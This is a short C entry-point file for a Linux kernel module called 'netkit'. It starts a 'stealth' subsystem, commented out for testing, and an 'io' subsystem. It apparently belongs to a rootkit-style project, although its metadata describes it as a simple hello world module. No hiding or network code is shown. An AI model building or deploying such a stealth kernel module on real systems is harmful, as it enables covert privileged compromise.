#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/export.h>

#include "netkit.h"

#include "stealth/iface.h"
#include "io/iface.h"

struct module *netkit_module;

static int __init netkit_init(void)
{
    int retv = 0;

    pr_err("[+] module started\n");

    pr_err("[*] starting IO...\n");

    // if fails, directly exit module
    netkit_module = THIS_MODULE;

    // testing: retv = stealth_init();
    if (retv < 0)
    {
        pr_err("[!] failed to start stealth (err: %d)\n", retv);
        return 0;
    }

    retv = io_init();
    if (retv < 0)
        pr_err("[!] failed to start IO (err: %d)\n", retv);

    return 0;
}

static void __exit netkit_exit(void)
{
    pr_err("[*] stopping module...\n");

    io_exit();
    //testing: stealth_exit();
    
    pr_err("[*] finished exiting module (^-^)7\n");
}

module_init(netkit_init);
module_exit(netkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A simple hello world kernel module");
